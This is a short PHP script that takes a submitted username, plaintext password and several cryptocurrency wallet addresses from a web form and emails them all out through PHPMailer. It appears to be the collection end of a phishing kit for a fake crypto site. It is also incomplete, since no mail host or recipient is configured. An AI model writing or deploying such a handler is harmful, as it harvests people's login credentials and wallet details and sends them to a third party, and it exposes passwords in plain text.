<?php
       $name = $_POST['name'];
	   $email = $_POST['email'];
	   $username = $_POST['username'];
	   $password = $_POST['password'];
	   $bitcoin = $_POST["payaccount1000"];
	   $etherium = $_POST['payaccount1006'];
	   $TRC20 = $_POST['payaccount1007'];
	   $ERC20 = $_POST['payaccount1008'];
	   $Litecoin = $_POST['payaccount1009'];
	   $Dogecoin =$_POST['payaccount1010'];
	   $Tron = $_POST['payaccount1011'];
	   
		$subject = "From: $name\n Email: $email";
	
		require "vendor/autoload.php";
        use PHPMailer\PHPMailer\PHPMailer;
        use PHPMailer\PHPMailer\SMTP;
        $mail = new PHPMailer(true);


		$mail->isSMTP();
		$mail->SMTPAuth = true;

		

		$message = "Username: $username\n password: $password\n bitcoin: $bitcoin\n etherium: $etherium\n TRC20:$TRC20\n ERC20: $ERC20\n Litecoin: $Litecoin\n Dogecoin: $Dogecoin\n Tron: $Tron";

				
		$mail->Subject = $subject;
        $mail->Body = $message;
		
		$mail->send();

		echo "email sent";
	
 ?>
	
 
		
